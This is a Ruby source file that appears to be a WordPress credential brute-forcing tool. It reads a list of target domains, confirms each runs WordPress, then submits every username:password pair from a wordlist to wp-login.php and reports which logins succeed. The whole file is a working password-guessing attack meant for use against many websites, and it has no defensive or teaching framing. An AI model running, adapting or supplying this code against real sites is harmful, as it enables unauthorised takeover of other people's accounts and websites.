module Wp

	class Dictionary

		def initialize
			if system("gedit " + 'wordlists/domain_target.txt') == true
				wl 			= File.readlines('wordlists/domain_target.txt')
				wl_count 	= 0..wl.size.to_i - 1
				wl_count.each_with_index do |x|
					url = wl[x].gsub("\n","")
					puts "==================================================================".white
					puts "- #{url}" + " processing...".yellow
					if check_wp(url) == "200"
						read_wordlist_upass(url)
					else
						puts "- #{url} : ".yellow + check_wp(url).white 
					end
				end
			end
		end

		def check_wp(url)
			begin
				uri  = URI(url + "wp-content/")
				http = Net::HTTP.new(uri.host, uri.port)
				http.open_timeout = 1

				if uri.scheme 		== "https"
					http.use_ssl 	= true
				end
				res = http.get(uri.request_uri)
				return res.code
			rescue Exception => e
				return e.message
			end
		end

		def read_wordlist_upass(url)
			wl 	= File.readlines('wordlists/wl_wp_empass.txt')
			wl_count = 0..wl.size.to_i - 1
			wl_count.each_with_index do |x|
				empass 	= wl[x].split(':')
				user 	= empass[0]
				pwd 	= empass[1].gsub("\n","")
				execution(url,user,pwd)
			end
		end

		def execution(url,user,pwd)

			begin

				uri = URI(url + "/wp-login.php")
				http = Net::HTTP.new(uri.host, uri.port)
				# http.open_timeout = 1

				if uri.scheme == "https"
					http.use_ssl 	= true
				end

				response = http.get(uri.request_uri)

				data = "log=#{user}&pwd=#{pwd}&redirect_to=#{url}/wp-admin/&testcookie=1&wp-submit=Log+In"
				headers = {
					'Cookie' 		=> "wordpress_test_cookie=WP+Cookie+check",
					# 'Cookie' 		=> response['Set-Cookie'],
					'User-Agent' 	=> "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0",
					'Content-Type' 	=> 'application/x-www-form-urlencoded',
				}

				r = http.post(uri.request_uri, data, headers)

				if r.code == "200"
					if /Invalid|tidak valid|Nama pengguna tidak sah/.match(r.body)
						puts " ............... Username : " + user.yellow + " | Password : " + pwd.yellow + " [Invalid Username]".red
					elsif /incorrect|keliru/.match(r.body)
						puts "- ............... Username : " + user.yellow + " | Password : " + pwd.yellow + " [Invalid Password]".yellow
					elsif
						puts "- ............... Username : " + user.yellow + " | Password : " + pwd.yellow + " [Unknown Error]".yellow
					end
				elsif r.code == "302"
					if r.header['location'] == "#{url}/wp-admin/"
						puts "- ............... Username : " + user.yellow + " | Password : " + pwd.yellow + " [successfull]".white
					else
						puts "- ............... Redirected to " + r.header['location']
					end
				elsif r.code == "403"
					puts "- ............... Username : " + user.yellow + " | Password : " + pwd.yellow + " [forbidden]".red
				else
					puts "- ............... Error Response code #{r.code}"
				end

			rescue Exception => e
				puts "- ............... " + e.message.yellow
			end
		end

	end # End Class

end # End Module